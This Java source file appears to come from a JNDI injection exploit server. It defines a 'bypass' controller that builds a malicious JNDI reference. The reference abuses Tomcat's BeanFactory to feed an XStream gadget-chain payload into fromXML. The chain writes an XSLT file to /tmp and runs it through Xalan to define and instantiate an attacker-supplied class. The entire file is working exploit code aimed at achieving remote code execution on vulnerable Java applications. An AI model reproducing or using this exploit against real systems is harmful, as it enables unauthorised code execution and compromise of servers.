package map.jndi.controller.bypass;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import javassist.bytecode.ClassFile;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.controller.BasicController;
import map.jndi.template.XsltHelper;
import map.jndi.util.MiscUtil;
import map.jndi.util.ReflectUtil;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.util.Base64;

@JNDIController
@JNDIMapping("/XStream")
public class XStreamController extends BasicController {
    @Override
    public Object process(byte[] byteCode) throws Exception {
        System.out.println("[Reference] Factory: BeanFactory + XStream");

        ClassFile classFile = new ClassFile(new DataInputStream(new ByteArrayInputStream(byteCode)));
        String className = classFile.getName();

        String fileName =  MiscUtil.getRandStr(8);
        String xsltPath = "/tmp/" + fileName + ".lock";
        String classPath = "/tmp/" + fileName + ".class";

        String helperClassName = MiscUtil.getClassName();
        ClassPool pool = ClassPool.getDefault();
        CtClass helperClazz = pool.get(XsltHelper.class.getName());
        helperClazz.replaceClassName(helperClazz.getName(), helperClassName);

        ReflectUtil.setCtField(helperClazz, "xsltPath", CtField.Initializer.constant(xsltPath));
        ReflectUtil.setCtField(helperClazz, "classPath", CtField.Initializer.constant(classPath));
        ReflectUtil.setCtField(helperClazz, "className", CtField.Initializer.constant(className));
        ReflectUtil.setCtField(helperClazz, "payload", CtField.Initializer.constant(Base64.getEncoder().encodeToString(byteCode)));

        String xsltContent = "<xsl:stylesheet version=\"1.0\"" +
                "  xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"" +
                "  xmlns:b64=\"http://xml.apache.org/xalan/java/java.util.Base64\"" +
                "  xmlns:de=\"http://xml.apache.org/xalan/java/java.util.Base64$Decoder\"" +
                "  xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"" +
                "  xmlns:th=\"http://xml.apache.org/xalan/java/java.lang.Thread\"" +
                "  xmlns:ru=\"http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\"" +
                "  xmlns:cls=\"http://xml.apache.org/xalan/java/java.lang.Class\"" +
                "  exclude-result-prefixes=\"b64 de ob th ru cls\">" +
                "  <xsl:template match=\"/\">" +
                "    <xsl:variable name=\"dec\" select=\"b64:getDecoder()\"/>" +
                "    <xsl:variable name=\"bs\" select=\"de:decode($dec, '" + Base64.getEncoder().encodeToString(helperClazz.toBytecode()) + "')\"/>" +
                "    <xsl:variable name=\"cl\" select=\"th:getContextClassLoader(th:currentThread())\"/>" +
                "    <xsl:variable name=\"clazz\" select=\"ru:defineClass('" + helperClassName + "', $bs, $cl)\"/>" +
                "   <xsl:variable name=\"inst\" select=\"cls:newInstance($clazz)\"/>" +
                "    <xsl:value-of select=\"$inst\"/>" +
                "  </xsl:template>" +
                "</xsl:stylesheet>";

        String payload = "<sorted-set>" +
                "  <javax.naming.ldap.Rdn_-RdnEntry>" +
                "    <type>test</type>" +
                "    <value class=\"javax.swing.MultiUIDefaults\" serialization=\"custom\">" +
                "      <unserializable-parents/>" +
                "      <hashtable>" +
                "        <default>" +
                "          <loadFactor>0.75</loadFactor>" +
                "          <threshold>525</threshold>" +
                "        </default>" +
                "        <int>700</int>" +
                "        <int>0</int>" +
                "      </hashtable>" +
                "      <javax.swing.UIDefaults>" +
                "        <default>" +
                "          <defaultLocale>zh_CN</defaultLocale>" +
                "          <resourceCache/>" +
                "        </default>" +
                "      </javax.swing.UIDefaults>" +
                "      <javax.swing.MultiUIDefaults>" +
                "        <default>" +
                "          <tables>" +
                "            <javax.swing.UIDefaults serialization=\"custom\">" +
                "              <unserializable-parents/>" +
                "              <hashtable>" +
                "                <default>" +
                "                  <loadFactor>0.75</loadFactor>" +
                "                  <threshold>525</threshold>" +
                "                </default>" +
                "                <int>700</int>" +
                "                <int>2</int>" +
                "                <string>1</string>" +
                "                <sun.swing.SwingLazyValue>" +
                "                  <className>com.sun.org.apache.xml.internal.security.utils.JavaUtils</className>" +
                "                  <methodName>writeBytesToFilename</methodName>" +
                "                  <args>" +
                "                    <string>" + xsltPath + "</string>" +
                "                    <byte-array>" + Base64.getEncoder().encodeToString(xsltContent.getBytes()) + "</byte-array>" +
                "                  </args>" +
                "                </sun.swing.SwingLazyValue>" +
                "                <string>2</string>" +
                "                <sun.swing.SwingLazyValue>" +
                "                  <className>com.sun.org.apache.xalan.internal.xslt.Process</className>" +
                "                  <methodName>_main</methodName>" +
                "                  <args>" +
                "                    <string-array>" +
                "                      <string>-XT</string>" +
                "                      <string>-XSL</string>" +
                "                      <string>file://" + xsltPath + "</string>" +
                "                    </string-array>" +
                "                  </args>" +
                "                </sun.swing.SwingLazyValue>" +
                "              </hashtable>" +
                "              <javax.swing.UIDefaults>" +
                "                <default>" +
                "                  <defaultLocale reference=\"../../../../../../../javax.swing.UIDefaults/default/defaultLocale\"/>" +
                "                  <resourceCache/>" +
                "                </default>" +
                "              </javax.swing.UIDefaults>" +
                "            </javax.swing.UIDefaults>" +
                "          </tables>" +
                "        </default>" +
                "      </javax.swing.MultiUIDefaults>" +
                "    </value>" +
                "  </javax.naming.ldap.Rdn_-RdnEntry>" +
                "  <javax.naming.ldap.Rdn_-RdnEntry>" +
                "    <type>test</type>" +
                "    <value class=\"com.sun.org.apache.xpath.internal.objects.XString\">" +
                "      <m__obj class=\"string\">test</m__obj>" +
                "    </value>" +
                "  </javax.naming.ldap.Rdn_-RdnEntry>" +
                "</sorted-set>";

        ResourceRef ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=fromXML"));
        ref.add(new StringRefAddr("x", payload));

        return ref;
    }
}